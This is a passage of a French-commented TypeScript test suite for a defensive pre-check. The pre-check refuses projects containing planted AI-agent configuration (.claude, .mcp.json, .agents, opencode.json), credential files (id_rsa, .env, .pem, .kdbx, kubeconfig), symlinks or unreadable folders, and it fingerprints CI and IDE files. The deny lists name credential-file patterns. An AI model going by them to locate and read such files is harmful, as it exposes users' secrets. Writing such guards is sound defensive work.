// Pré-contrôle de la Salle OMO (spécification §3.15.2 l.523-530, §3.7 l.309, F-t l.176, F-u l.177, F-z l.182, §9.3 n° 11 l.1409,
// §7.5 l.1147, G8 l.1222, JS-4 ; plan d'exécution 2 bis-2 ter §6 L19a, D-2b-19, D-2b-34, D-2b-35, D-2b-37) :
// T-L19-a (les 15 dépôts piégés, partie CI de G8), T-L19-b (piège dans un parent), T-L19-c (dossiers d'état acceptés),
// T-L19-d (lien, illisible, profondeur), T-L19-g (liste masquée et bornée), empreintes, bornes, renommage, T-L19-h (pureté).
//
// Les cas qui demandent un lien symbolique ou un dossier illisible sont **sautés avec leur raison** quand le disque de la
// machine ne sait pas les fabriquer (Windows sans mode développeur, superutilisateur) ; ils sont obligatoires en CI Linux.
import assert from "node:assert/strict";
import crypto from "node:crypto";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { describe, it, type TestContext } from "node:test";
import {
  DOSSIERS_IDE_CI,
  precontrolerProjet,
  releverEmpreintes,
  releverEmpreintesSalle,
  releverGitsWorkspace,
  releverProjet,
  type ReleveEmpreintes,
  renommerSansSuivreLiens,
} from "./omo-precheck-reader.ts";
import { detect, etatInitial, type OmoDiskElement, type OmoDiskSnapshot } from "./shared/omo-detections.ts";
import {
  analyserConfigGit,
  cheminMasque,
  decidePrecheck,
  estDossierEtatOmo,
  estFichierCle,
  gitsHorsProtection,
  memeNom,
  NOMS_CONFIG_EXTENSION,
  NOMS_CONFIG_OPENCODE,
  NOMS_DANS_OMO_ACCEPTES,
  OMO_PRECHECK_REASONS,
  type OmoPrecheckReason,
  PRECHECK_BORNES,
  type PrecheckFaits,
  raisonDansDossierOmo,
  raisonDuNom,
} from "./shared/omo-precheck-rules.ts";
import { echangerParLienAuLstat } from "./test-support/omo-echange-lien.ts";
import { DEPOTS_PIEGES, fabriquerDepotsPieges, fabriquerProjet, poser, PROJET_ETAT_OMO, PROJET_SAIN } from "./test-support/omo-trapped-repos.ts";

/** Dossier de travail jetable, effacé à la fin du test même en échec. */
function atelier(t: TestContext, prefixe = "omo-precheck-"): string {
  const racine = fs.mkdtempSync(path.join(os.tmpdir(), prefixe));
  t.after(() => {
    try {
      fs.rmSync(racine, { recursive: true, force: true });
    } catch {
      // Dossier profond ou verrouillé : c'est un dossier temporaire, le système le reprendra.
    }
  });
  return racine;
}

/** Crée un lien symbolique, ou rend false si le disque refuse (Windows sans droit de création de lien). */
function lien(cible: string, chemin: string, type: "dir" | "file"): boolean {
  try {
    fs.symlinkSync(cible, chemin, type);
    return fs.lstatSync(chemin).isSymbolicLink();
  } catch {
    return false;
  }
}

/** Rend un dossier illisible, ou false si le système ne l'applique pas (Windows, superutilisateur). */
function rendreIllisible(dossier: string): boolean {
  try {
    fs.chmodSync(dossier, 0o000);
    fs.readdirSync(dossier);
    fs.chmodSync(dossier, 0o755);
    return false;
  } catch {
    return true;
  }
}

const faits = (over: Partial<PrecheckFaits> = {}): PrecheckFaits => ({
  projet: "projet",
  horsWorkspace: false,
  prepare: true,
  profondeurDepassee: false,
  empreinteImpossible: false,
  trouves: [],
  ...over,
});

// --- T-L19-a : les 15 dépôts piégés (partie CI de G8) ----------------------------------------------------------------------------

describe("pré-contrôle : dépôts piégés (G8, T-L19-a)", () => {
  it("les 15 dépôts piégés sont refusés, chacun avec sa raison, et le projet sain reste conforme", async (t) => {
    const workspace = atelier(t);
    const depots = fabriquerDepotsPieges(workspace);
    assert.equal(depots.length, 15, "la porte G8 demande 15 dépôts piégés");
    assert.equal(new Set(depots.map((depot) => depot.id)).size, 15, "identifiants de pièges en double");
    for (const depot of depots) {
      const decision = await precontrolerProjet(depot.projet, { workspace });
      assert.equal(decision.verdict, "refuse", `${depot.id} (${depot.quoi}) accepté`);
      assert.equal(decision.raison, depot.raison, `${depot.id} (${depot.quoi})`);
      assert.ok(decision.trouves.length >= 1, `${depot.id} : aucun chemin listé`);
      // T-L19-b : un piège posé dans un parent est bien attribué à un parent (« ../… »), pas au projet.
      const attendu = depot.ou === "parent" ? ".." : ".";
      assert.ok(
        decision.trouves.some((chemin) => chemin.startsWith(attendu) && (attendu === ".." || !chemin.startsWith(".."))),
        `${depot.id} : chemins ${JSON.stringify(decision.trouves)} sans entrée en « ${attendu} »`,
      );
    }
    const sain = await precontrolerProjet(PROJET_SAIN, { workspace });
    assert.deepEqual(sain, { projet: PROJET_SAIN, verdict: "conforme", raison: null, trouves: [] });
  });

  it("chaque piège couvre une raison de la liste fermée, et les trois raisons de disque sont couvertes", () => {
    const raisons = new Set(DEPOTS_PIEGES.map((depot) => depot.raison));
    for (const raison of raisons) assert.ok(OMO_PRECHECK_REASONS.includes(raison), raison);
    assert.deepEqual([...raisons].sort(), ["config-extension", "config-opencode", "fichier-cle"]);
    // D-2b-34 : .agents/ rejoint la liste, dans le projet ET dans un parent.
    const agents = DEPOTS_PIEGES.filter((depot) => depot.quoi.startsWith(".agents/"));
    assert.deepEqual(agents.map((depot) => depot.ou).sort(), ["parent", "projet"]);
  });

  it("un nom refusé posé dans le dossier de travail lui-même refuse un projet situé plus bas (« jusqu'à /workspace inclus »)", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "equipe/projet");
    poser(workspace, "opencode.json", '{"[synthétique]": "configuration piégée"}');
    const decision = await precontrolerProjet("equipe/projet", { workspace });
    assert.equal(decision.raison, "config-opencode");
    assert.deepEqual(decision.trouves, ["../../opencode.json"]);
  });

  it("aucune descente récursive (D-2b-19) : le même nom posé plus bas dans le projet ne refuse rien", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/sous/dossier/opencode.json", "{}");
    poser(workspace, "projet/sous/dossier/id_rsa", "[synthétique]");
    poser(workspace, "projet/sous/.agents/skills/x/SKILL.md", "[synthétique]");
    const decision = await precontrolerProjet("projet", { workspace });
    assert.equal(decision.verdict, "conforme", JSON.stringify(decision.trouves));
  });

  it("le dossier de travail lui-même peut être contrôlé comme projet", async (t) => {
    const workspace = atelier(t);
    poser(workspace, ".mcp.json", "{}");
    const decision = await precontrolerProjet(".", { workspace });
    assert.equal(decision.projet, ".");
    assert.equal(decision.raison, "config-opencode");
    assert.deepEqual(decision.trouves, ["./.mcp.json"]);
  });
});

// --- T-L19-c : dossiers d'état acceptés (§9.3 n° 11) -------------------------------------------------------------------------------

describe("pré-contrôle : ce qui reste accepté (T-L19-c)", () => {
  it("le dossier .omo d'état (boulder*.json, plans/, notepads/) ne refuse pas le projet", async (t) => {
    const workspace = atelier(t);
    fabriquerDepotsPieges(workspace);
    const decision = await precontrolerProjet(PROJET_ETAT_OMO, { workspace });
    assert.equal(decision.verdict, "conforme", JSON.stringify(decision.trouves));
    for (const nom of NOMS_DANS_OMO_ACCEPTES) assert.equal(raisonDansDossierOmo(nom), null, nom);
  });

  it("la configuration de l'extension dans .omo est refusée, elle seule", () => {
    assert.equal(raisonDansDossierOmo("omo.json"), "config-extension");
    assert.equal(raisonDansDossierOmo("omo.jsonc"), "config-extension");
    assert.equal(raisonDansDossierOmo("boulder.json"), null);
    assert.equal(raisonDansDossierOmo("boulder-2.json"), null);
    assert.equal(raisonDansDossierOmo("plans"), null);
    assert.equal(raisonDansDossierOmo("notepads"), null);
  });

  it("un .omo d'état ajouté à un projet sain le laisse conforme, un .omo/omo.json le refuse", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/.omo/boulder.json", "{}");
    assert.equal((await precontrolerProjet("projet", { workspace })).verdict, "conforme");
    poser(workspace, "projet/.omo/omo.jsonc", "{}");
    const apres = await precontrolerProjet("projet", { workspace });
    assert.equal(apres.raison, "config-extension");
    assert.deepEqual(apres.trouves, ["./.omo/omo.jsonc"]);
  });
});

// --- Noms et fichiers de clés ------------------------------------------------------------------------------------------------------

describe("pré-contrôle : noms refusés et fichiers de clés", () => {
  it("les deux listes de noms ne se recouvrent pas et portent les noms de la spécification", () => {
    const croisement = NOMS_CONFIG_EXTENSION.filter((nom) => NOMS_CONFIG_OPENCODE.includes(nom));
    assert.deepEqual(croisement, []);
    for (const nom of [".agents", ".sisyphus", "oh-my-openagent.json", "oh-my-openagent.jsonc", "oh-my-opencode.json", "oh-my-opencode.jsonc"]) {
      assert.equal(raisonDuNom(nom), "config-extension", nom);
    }
    for (const nom of [".claude", ".mcp.json", ".opencode", "opencode.json", "opencode.jsonc"]) {
      assert.equal(raisonDuNom(nom), "config-opencode", nom);
    }
    // Le dossier d'état et les noms ordinaires ne disent rien par eux-mêmes.
    for (const nom of [".omo", ".git", "README.md", "package.json", "src", ".github"]) assert.equal(raisonDuNom(nom), null, nom);
  });

  it("les noms refusés sont reconnus sans tenir compte de la casse (dossier Windows monté : « OpenCode.json » est lu)", () => {
    for (const nom of [".SISYPHUS", ".Agents", "OH-MY-OPENCODE.JSONC", "Oh-My-OpenAgent.json"]) {
      assert.equal(raisonDuNom(nom), "config-extension", nom);
    }
    for (const nom of ["OpenCode.json", "OPENCODE.JSONC", ".Claude", ".MCP.json", ".OpenCode"]) {
      assert.equal(raisonDuNom(nom), "config-opencode", nom);
    }
    assert.equal(raisonDansDossierOmo("Omo.JSON"), "config-extension");
    assert.equal(raisonDansDossierOmo("OMO.JSONC"), "config-extension");
    assert.equal(raisonDansDossierOmo("Boulder.json"), null);
    assert.equal(estDossierEtatOmo(".OMO"), true);
    assert.equal(estDossierEtatOmo(".omo2"), false);
    assert.equal(memeNom("Jenkinsfile", "JENKINSFILE"), true);
    assert.equal(memeNom("opencode.json", "opencode.jsonc"), false);
  });

  it("un piège écrit dans une autre casse refuse le projet, et la liste garde le nom du disque", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "equipe/projet");
    poser(workspace, "equipe/projet/OpenCode.json", '{"[synthétique]": "configuration piégée"}');
    const opencode = await precontrolerProjet("equipe/projet", { workspace });
    assert.equal(opencode.raison, "config-opencode");
    assert.deepEqual(opencode.trouves, ["./OpenCode.json"]);
    fs.rmSync(path.join(workspace, "equipe/projet/OpenCode.json"));
    poser(workspace, "equipe/.SISYPHUS/etat.json", '{"[synthétique]": "état piégé"}');
    const sisyphus = await precontrolerProjet("equipe/projet", { workspace });
    assert.equal(sisyphus.raison, "config-extension");
    assert.deepEqual(sisyphus.trouves, ["../.SISYPHUS"]);
    fs.rmSync(path.join(workspace, "equipe/.SISYPHUS"), { recursive: true });
    // Le dossier d'état écrit .OMO reste accepté ; la configuration qu'il porte, dans n'importe quelle casse, est refusée.
    poser(workspace, "equipe/projet/.OMO/boulder.json", "{}");
    assert.equal((await precontrolerProjet("equipe/projet", { workspace })).verdict, "conforme");
    poser(workspace, "equipe/projet/.OMO/Omo.JSONC", "{}");
    const omo = await precontrolerProjet("equipe/projet", { workspace });
    assert.equal(omo.raison, "config-extension");
    assert.deepEqual(omo.trouves, ["./.OMO/Omo.JSONC"]);
  });

  it("les fichiers de clés (motifs de KEY_FILE_READ_RULES et extensions P03) sont refusés, .env.example non", () => {
    for (const nom of [".env", ".env.local", "prod.env", "serveur.pfx", "x.p12", "x.key", "x.KEY", "x.jks", "x.keystore", "x.kdbx"]) {
      assert.equal(estFichierCle(nom), true, nom);
      assert.equal(raisonDuNom(nom), "fichier-cle", nom);
    }
    for (const nom of ["privkey-2026", "serveur-key.pem", "serveur_key.pem", "id_rsa", "id_rsa.pub", "id_ecdsa", "id_ed25519", "kubeconfig"]) {
      assert.equal(estFichierCle(nom), true, nom);
    }
    // Extensions P03 (l.662) absentes de KEY_FILE_READ_RULES.
    for (const ext of ["pem", "crt", "cer", "der", "p8", "gpg", "asc", "ovpn", "tfstate", "tfvars"]) {
      assert.equal(estFichierCle(`x.${ext}`), true, ext);
      assert.equal(estFichierCle(`x.${ext.toUpperCase()}`), true, ext);
    }
    for (const nom of [".env.example", "app.env.example", "README.md", "package.json", "Makefile", "cle.txt", "notes.keyboard"]) {
      assert.equal(estFichierCle(nom), false, nom);
    }
  });

  it("un fichier de clés à la racine du projet ou d'un parent refuse le projet", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "equipe/projet");
    poser(workspace, "equipe/projet/.env", "[synthétique]");
    assert.equal((await precontrolerProjet("equipe/projet", { workspace })).raison, "fichier-cle");
    fs.rmSync(path.join(workspace, "equipe/projet/.env"));
    poser(workspace, "equipe/projet/.env.example", "[synthétique]");
    assert.equal((await precontrolerProjet("equipe/projet", { workspace })).verdict, "conforme");
    poser(workspace, "equipe/client.pem", "[synthétique]");
    const decision = await precontrolerProjet("equipe/projet", { workspace });
    assert.equal(decision.raison, "fichier-cle");
    assert.deepEqual(decision.trouves, ["../****.pem"]);
  });
});

// --- T-L19-d : liens, illisible, profondeur, hors du dossier de travail --------------------------------------------------------------

describe("pré-contrôle : fermé en cas de doute (T-L19-d)", () => {
  it("un lien symbolique sur le chemin du projet refuse le projet", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "vrai/projet");
    if (!lien(path.join(workspace, "vrai"), path.join(workspace, "raccourci"), "dir")) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const decision = await precontrolerProjet("raccourci/projet", { workspace });
    assert.equal(decision.raison, "lien-symbolique");
    // Le fait porte la hauteur du composant en cause (« .. » = le parent du projet), jamais le nom d'un dossier.
    assert.deepEqual(decision.trouves, [".."]);
  });

  it("un projet qui est lui-même un lien symbolique est refusé", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "vrai");
    if (!lien(path.join(workspace, "vrai"), path.join(workspace, "projet"), "dir")) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const decision = await precontrolerProjet("projet", { workspace });
    assert.equal(decision.raison, "lien-symbolique");
    assert.deepEqual(decision.trouves, ["."]);
  });

  it("un .omo qui est un lien symbolique refuse le projet (son contenu n'est pas suivi)", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "ailleurs/omo.json", "{}");
    if (!lien(path.join(workspace, "ailleurs"), path.join(workspace, "projet", ".omo"), "dir")) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const decision = await precontrolerProjet("projet", { workspace });
    assert.equal(decision.raison, "lien-symbolique");
    assert.deepEqual(decision.trouves, ["./.omo"]);
  });

  it("un lien posé dans .omo refuse le projet quel que soit son nom (l'extension y écrit elle-même)", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/.omo/boulder.json", "{}");
    poser(workspace, "voisin/src/index.ts", "export const x = 1;\n");
    poser(workspace, "voisin/etat.json", "{}");
    assert.equal((await precontrolerProjet("projet", { workspace })).verdict, "conforme");
    const plans = lien(path.join(workspace, "voisin", "src"), path.join(workspace, "projet", ".omo", "plans"), "dir");
    const boulder = lien(path.join(workspace, "voisin", "etat.json"), path.join(workspace, "projet", ".omo", "boulder-2.json"), "file");
    if (!plans || !boulder) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    const decision = await precontrolerProjet("projet", { workspace });
    assert.equal(decision.raison, "lien-symbolique");
    assert.deepEqual(decision.trouves, ["./.omo/boulder-2.json", "./.omo/plans"]);
  });

  it("un dossier parent illisible refuse le projet", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "equipe/projet");
    if (!rendreIllisible(path.join(workspace, "equipe"))) {
      t.skip("ce système ne rend pas un dossier illisible (Windows, superutilisateur) ; obligatoire en CI Linux");
      return;
    }
    t.after(() => {
      try {
        fs.chmodSync(path.join(workspace, "equipe"), 0o755);
      } catch {
        // Déjà effacé.
      }
    });
    const decision = await precontrolerProjet("equipe/projet", { workspace });
    assert.equal(decision.raison, "illisible");
  });

  it("un projet plus profond que la borne est refusé, la borne de production vaut 256", async (t) => {
    assert.equal(PRECHECK_BORNES.profondeurMax, 256);
    const workspace = atelier(t);
    fabriquerProjet(workspace, "a/b/c/projet");
    // Borne réduite passée par l'appelant (jamais une variable d'environnement) : le cas réel à 257 niveaux est joué plus bas.
    assert.equal((await precontrolerProjet("a/b/c/projet", { workspace, bornes: { profondeurMax: 4 } })).verdict, "conforme");
    const decision = await precontrolerProjet("a/b/c/projet", { workspace, bornes: { profondeurMax: 3 } });
    assert.equal(decision.raison, "profondeur");
    assert.deepEqual(decision.trouves, []);
  });

  it("un projet à 257 niveaux est refusé pour sa profondeur", async (t) => {
    const workspace = atelier(t, "omo-profond-");
    const profond = Array.from({ length: 257 }, (_, index) => `n${index}`).join("/");
    try {
      fs.mkdirSync(path.join(workspace, profond), { recursive: true });
    } catch {
      t.skip("ce disque n'accepte pas un chemin de 257 niveaux ; la borne est jouée au-dessus avec une valeur réduite");
      return;
    }
    assert.equal((await precontrolerProjet(profond, { workspace })).raison, "profondeur");
  });

  it("un projet hors du dossier de travail est refusé, sans rien lire au-dessus", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    for (const projet of ["../ailleurs", "projet/../../ailleurs", path.join(os.tmpdir(), "ailleurs")]) {
      const decision = await precontrolerProjet(projet, { workspace });
      assert.equal(decision.raison, "hors-workspace", projet);
      assert.deepEqual(decision.trouves, [], projet);
    }
  });

  it("un projet absent de la liste des projets préparés est refusé (§9.4 n° 2)", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    fabriquerProjet(workspace, "autre");
    assert.equal((await precontrolerProjet("projet", { workspace, prepares: ["projet"] })).verdict, "conforme");
    assert.equal((await precontrolerProjet("projet", { workspace, prepares: ["./projet/"] })).verdict, "conforme");
    assert.equal((await precontrolerProjet("projet", { workspace, prepares: ["autre"] })).raison, "non-prepare");
    assert.equal((await precontrolerProjet("projet", { workspace, prepares: [] })).raison, "non-prepare");
  });
});

// --- T-L19-g : liste masquée, relative et bornée ------------------------------------------------------------------------------------

describe("pré-contrôle : liste des chemins trouvés (T-L19-g)", () => {
  it("la liste est relative, masquée et bornée à 20", async (t) => {
    assert.equal(PRECHECK_BORNES.trouvesMax, 20);
    const workspace = atelier(t);
    fabriquerProjet(workspace, "equipe/projet");
    const projet = "equipe/projet";
    for (const nom of [...NOMS_CONFIG_EXTENSION, ...NOMS_CONFIG_OPENCODE]) poser(workspace, `${projet}/${nom}/marque.txt`);
    poser(workspace, `${projet}/.omo/omo.json`, "{}");
    poser(workspace, `${projet}/.omo/omo.jsonc`, "{}");
    for (const nom of ["client-prod.pem", "banque.pfx", "sauvegarde.kdbx", "vpn.ovpn", ".env", "etat.tfstate", "signature.asc", "depot.jks"]) {
      poser(workspace, `${projet}/${nom}`);
    }
    const decision = await precontrolerProjet(projet, { workspace });
    assert.equal(decision.verdict, "refuse");
    assert.equal(decision.trouves.length, 20, JSON.stringify(decision.trouves));
    for (const chemin of decision.trouves) {
      assert.ok(chemin.startsWith("./") || chemin.startsWith("../"), `chemin non relatif : ${chemin}`);
      assert.equal(path.isAbsolute(chemin), false, chemin);
      assert.equal(chemin.includes(workspace), false, "le chemin du dossier de travail ne doit jamais sortir");
      assert.equal(chemin.includes("equipe"), false, "aucun nom de dossier de l'utilisateur ne doit sortir");
    }
    // Un nom choisi par l'utilisateur est masqué ; son extension seule reste lisible.
    for (const nom of ["client-prod", "banque", "sauvegarde", "vpn", "signature", "depot"]) {
      assert.equal(decision.trouves.some((chemin) => chemin.includes(nom)), false, nom);
    }
    assert.ok(decision.trouves.includes("./****.pem"), JSON.stringify(decision.trouves));
    // Un nom de la liste fermée reste en clair : il ne dit rien de l'utilisateur.
    assert.ok(decision.trouves.includes("./opencode.json"));
    assert.ok(decision.trouves.includes("./.omo/omo.json"));
  });

  it("le masquage garde la hauteur, l'extension connue et rien d'autre", () => {
    assert.equal(cheminMasque({ remontee: 0, nom: "opencode.jsonc", raison: "config-opencode" }), "./opencode.jsonc");
    assert.equal(cheminMasque({ remontee: 2, nom: ".sisyphus", raison: "config-extension" }), "../../.sisyphus");
    assert.equal(cheminMasque({ remontee: 1, nom: ".omo/omo.json", raison: "config-extension" }), "../.omo/omo.json");
    assert.equal(cheminMasque({ remontee: 1, nom: "acme-prod.PEM", raison: "fichier-cle" }), "../****.pem");
    assert.equal(cheminMasque({ remontee: 0, nom: ".env", raison: "fichier-cle" }), "./****");
    assert.equal(cheminMasque({ remontee: 0, nom: "client.prod.secret-tres-long", raison: "fichier-cle" }), "./****");
    assert.equal(cheminMasque({ remontee: 3, nom: "", raison: "illisible" }), "../../..");
  });
});

// --- decidePrecheck : fermé en cas de doute ------------------------------------------------------------------------------------------

describe("decidePrecheck : décision pure", () => {
  it("sans aucun fait, le projet est conforme", () => {
    assert.deepEqual(decidePrecheck(faits()), { projet: "projet", verdict: "conforme", raison: null, trouves: [] });
  });

  it("chaque fait refuse à lui seul, avec sa raison", () => {
    const cas: [Partial<PrecheckFaits>, OmoPrecheckReason][] = [
      [{ horsWorkspace: true }, "hors-workspace"],
      [{ prepare: false }, "non-prepare"],
      [{ profondeurDepassee: true }, "profondeur"],
      [{ empreinteImpossible: true }, "empreinte-impossible"],
      [{ trouves: [{ remontee: 0, nom: "opencode.json", raison: "config-opencode" }] }, "config-opencode"],
      [{ trouves: [{ remontee: 1, nom: ".sisyphus", raison: "config-extension" }] }, "config-extension"],
      [{ trouves: [{ remontee: 0, nom: "x.pem", raison: "fichier-cle" }] }, "fichier-cle"],
      [{ trouves: [{ remontee: 0, nom: ".omo", raison: "lien-symbolique" }] }, "lien-symbolique"],
      [{ trouves: [{ remontee: 2, nom: "", raison: "illisible" }] }, "illisible"],
    ];
    for (const [over, raison] of cas) {
      const decision = decidePrecheck(faits(over));
      assert.equal(decision.verdict, "refuse", raison);
      assert.equal(decision.raison, raison);
    }
    // Les neuf raisons de la liste fermée sont toutes atteignables.
    assert.deepEqual([...new Set(cas.map(([, raison]) => raison))].sort(), [...OMO_PRECHECK_REASONS].sort());
  });

  it("plusieurs faits : la forme du projet passe avant les pièges, les pièges avant les doutes", () => {
    const piegeEtDoute = faits({
      trouves: [
        { remontee: 0, nom: "", raison: "illisible" },
        { remontee: 0, nom: ".opencode", raison: "config-opencode" },
        { remontee: 0, nom: "oh-my-opencode.json", raison: "config-extension" },
      ],
    });
    assert.equal(decidePrecheck(piegeEtDoute).raison, "config-extension");
    assert.equal(decidePrecheck({ ...piegeEtDoute, empreinteImpossible: true }).raison, "config-extension");
    assert.equal(decidePrecheck({ ...piegeEtDoute, horsWorkspace: true }).raison, "hors-workspace");
    assert.equal(decidePrecheck({ ...piegeEtDoute, prepare: false }).raison, "non-prepare");
  });

  it("la liste est triée, sans doublon, et bornée par les bornes passées", () => {
    const decision = decidePrecheck(
      faits({
        trouves: [
          { remontee: 2, nom: "opencode.json", raison: "config-opencode" },
          { remontee: 0, nom: "b.pem", raison: "fichier-cle" },
          { remontee: 0, nom: "a.pem", raison: "fichier-cle" },
          { remontee: 0, nom: ".claude", raison: "config-opencode" },
        ],
      }),
    );
    // « ****.pem » deux fois de suite est un seul chemin masqué : la liste ne le répète pas.
    assert.deepEqual(decision.trouves, ["./.claude", "./****.pem", "../../opencode.json"]);
    const bornee = decidePrecheck(
      faits({ trouves: [{ remontee: 0, nom: ".claude", raison: "config-opencode" }, { remontee: 1, nom: ".opencode", raison: "config-opencode" }] }),
      { ...PRECHECK_BORNES, trouvesMax: 1 },
    );
    assert.deepEqual(bornee.trouves, ["./.claude"]);
  });
});

// --- Empreintes ----------------------------------------------------------------------------------------------------------------------

describe("pré-contrôle : empreintes des fichiers d'IDE et de CI", () => {
  it("les empreintes sont stables, puis changent après une modification", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    poser(workspace, "projet/.vscode/tasks.json", '{"[synthétique]": "tâche"}');
    poser(workspace, "projet/.github/workflows/ci.yml", "nom: [synthétique]\n");
    poser(workspace, "projet/package.json", '{"name": "projet"}');
    poser(workspace, "projet/outils/aide.ps1", "# [synthétique]\n");
    poser(workspace, "projet/build.ps1", "# [synthétique]\n");
    poser(workspace, "projet/Jenkinsfile", "// [synthétique]\n");
    poser(workspace, "projet/azure-pipelines-v2.yml", "# [synthétique]\n");
    poser(workspace, "projet/src/index.ts", "export const x = 1;\n");
    const dossier = path.join(workspace, "projet");
    const premier = await releverEmpreintes(dossier, "projet");
    const second = await releverEmpreintes(dossier, "projet");
    assert.deepEqual(premier, second, "deux relevés de suite doivent être identiques");
    assert.equal(premier.impossible, false);
    assert.equal(premier.git, "dossier");
    // Les fichiers signalés (§4.14.5) le sont à toute profondeur : « outils/aide.ps1 » compte comme « build.ps1 ».
    assert.deepEqual(
      premier.fichiers.map((fichier) => fichier.chemin),
      [".github/workflows/ci.yml", ".vscode/tasks.json", "Jenkinsfile", "azure-pipelines-v2.yml", "build.ps1", "outils/aide.ps1", "package.json"],
    );
    for (const fichier of premier.fichiers) assert.match(fichier.sha256, /^[0-9a-f]{64}$/);
    poser(workspace, "projet/.vscode/tasks.json", '{"[synthétique]": "tâche modifiée"}');
    const apres = await releverEmpreintes(dossier, "projet");
    const avant = new Map(premier.fichiers.map((fichier) => [fichier.chemin, fichier.sha256]));
    const change = apres.fichiers.filter((fichier) => avant.get(fichier.chemin) !== fichier.sha256);
    assert.deepEqual(change.map((fichier) => fichier.chemin), [".vscode/tasks.json"]);
  });

  it("la forme de .git est relevée sans être suivie", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "avec-git");
    fs.mkdirSync(path.join(workspace, "sans-git"));
    poser(workspace, "fichier-git/.git", "gitdir: ../vrai/.git\n");
    assert.equal((await releverEmpreintes(path.join(workspace, "avec-git"), "avec-git")).git, "dossier");
    assert.equal((await releverEmpreintes(path.join(workspace, "sans-git"), "sans-git")).git, "absent");
    assert.equal((await releverEmpreintes(path.join(workspace, "fichier-git"), "fichier-git")).git, "fichier");
    const cible = path.join(workspace, "avec-git", ".git");
    if (!lien(cible, path.join(workspace, "sans-git", ".git"), "dir")) {
      t.skip("ce disque ne crée pas de lien symbolique (Windows sans mode développeur) ; obligatoire en CI Linux");
      return;
    }
    assert.equal((await releverEmpreintes(path.join(workspace, "sans-git"), "sans-git")).git, "lien");
  });

  it("au-delà des bornes, l'empreinte est impossible et le projet est refusé", async (t) => {
    assert.equal(PRECHECK_BORNES.empreintesMaxFichiers, 2000);
    assert.equal(PRECHECK_BORNES.empreinteTailleMaxOctets, 1024 * 1024);
    const workspace = atelier(t);
    fabriquerProjet(workspace, "trop-de-fichiers");
    for (let index = 0; index < 4; index++) poser(workspace, `trop-de-fichiers/.github/workflows/w${index}.yml`, "# [synthétique]\n");
    // Borne du nombre de fichiers réduite par l'appelant : la borne de production (2 000) est vérifiée juste au-dessus.
    const bornes = { empreintesMaxFichiers: 3 };
    assert.equal((await precontrolerProjet("trop-de-fichiers", { workspace, bornes: { empreintesMaxFichiers: 4 } })).verdict, "conforme");
    const decision = await precontrolerProjet("trop-de-fichiers", { workspace, bornes });
    assert.equal(decision.raison, "empreinte-impossible");
    assert.deepEqual(decision.trouves, []);
    // Un seul fichier au-delà de 1 Mio suffit, sans borne réduite. Un fichier tout juste sous la borne passe.
    fabriquerProjet(workspace, "fichier-trop-gros");
    poser(workspace, "fichier-trop-gros/.vscode/gros.json", "x".repeat(PRECHECK_BORNES.empreinteTailleMaxOctets + 1));
    assert.equal((await precontrolerProjet("fichier-trop-gros", { workspace })).raison, "empreinte-impossible");
    fabriquerProjet(workspace, "fichier-juste-assez");
    poser(workspace, "fichier-juste-assez/.vscode/gros.json", "x".repeat(PRECHECK_BORNES.empreinteTailleMaxOctets));
    assert.equal((await precontrolerProjet("fichier-juste-assez", { workspace })).verdict, "conforme");
  });

  it("borne de production : 2 000 fichiers sont relevés, le 2 001e rend l'empreinte impossible", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    const workflows = path.join(workspace, "projet", ".github", "workflows");
    fs.mkdirSync(workflows, { recursive: true });
    const borne = PRECHECK_BORNES.empreintesMaxFichiers;
    for (let index = 0; index < borne; index++) fs.writeFileSync(path.join(workflows, `w${index}.yml`), `# [synthétique] ${index}\n`);
    const juste = await releverEmpreintes(path.join(workspace, "projet"), "projet");
    assert.equal(juste.impossible, false);
    assert.equal(juste.fichiers.length, borne);
    fs.writeFileSync(path.join(workflows, `w${borne}.yml`), `# [synthétique] ${borne}\n`);
    const decision = await precontrolerProjet("projet", { workspace });
    assert.equal(decision.raison, "empreinte-impossible");
    assert.deepEqual(decision.trouves, []);
  });

  it("les fichiers de la racine comptent eux aussi dans la borne du nombre", async (t) => {
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    for (let index = 0; index < 4; index++) poser(workspace, `projet/outil-${index}.ps1`, "# [synthétique]\n");
    assert.equal((await precontrolerProjet("projet", { workspace, bornes: { empreintesMaxFichiers: 4 } })).verdict, "conforme");
    assert.equal((await precontrolerProjet("projet", { workspace, bornes: { empreintesMaxFichiers: 3 } })).raison, "empreinte-impossible");
  });

  it("un dossier trop peuplé est un doute, et un dossier d'IDE trop profond rend l'empreinte impossible", async (t) => {
    assert.equal(PRECHECK_BORNES.entreesMaxParDossier, 200_000);
    assert.equal(PRECHECK_BORNES.profondeurRelevesMax, 64);
    const workspace = atelier(t);
    fabriquerProjet(workspace, "projet");
    // Le projet fabriqué porte déjà .git et README.md : une borne à 1 entrée le tronque, une borne large le laisse passer.
    assert.equal((await precontrolerProjet("projet", { workspace, bornes: { entreesMaxParDossier: 50 } })).verdict, "conforme");
    assert.equal((await precontrolerProjet("projet", { workspace, bornes: { entreesMaxParDossier: 1 } })).raison, "illisible");
